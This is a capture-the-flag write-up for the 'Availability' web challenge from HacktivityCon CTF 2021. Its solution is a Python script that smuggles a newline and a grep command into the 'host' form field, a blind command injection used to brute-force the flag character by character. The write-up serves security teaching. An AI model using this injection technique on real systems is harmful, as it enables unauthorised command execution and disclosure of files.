---
name: Availability (2021)
event: HacktivityCon CTF 2021
category: Web
description: Writeup for Availability (Web) - HacktivityCon CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Availability

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/niPj8jYahV0/0.jpg)](https://youtu.be/niPj8jYahV0?t=5074s "HacktivityCon 2021: Availability")

## Challenge Description

> My schol was trying to teach people about the CIA triad so they made all these dumb example applications... as if they know anything about information security.
>
> They said they fixed the bug from the last app, but they also said they knew they went overboard with the filtered characters, so they loosened things up a bit. Can you hack it?

## Solution

{% code overflow="wrap" %}
```py
import requests
import string

flag = "flag."
url = "http://challenge.ctf.games:30669/"

# Each time a successful login is seen, restart loop
restart = True

while restart:
    restart = False
    # Loop through chars
    for i in string.ascii_lowercase + string.digits:
        payload = flag + i
        post_data = {'host': '127.0.0.1\x0Agrep ' + payload + ' flag.txt'}
        r = requests.post(url, data=post_data)
        # Correct char results in "successful password"
        if 'Success' in r.text:
            print(payload.replace('.', '{'))
            restart = True
            flag = payload
            # Exit if we have flag{32-hex
            if len(flag) == 37:
                print('\nFlag: ' + flag.replace('.', '{') + '}')
                exit(0)
            break
```
{% endcode %}
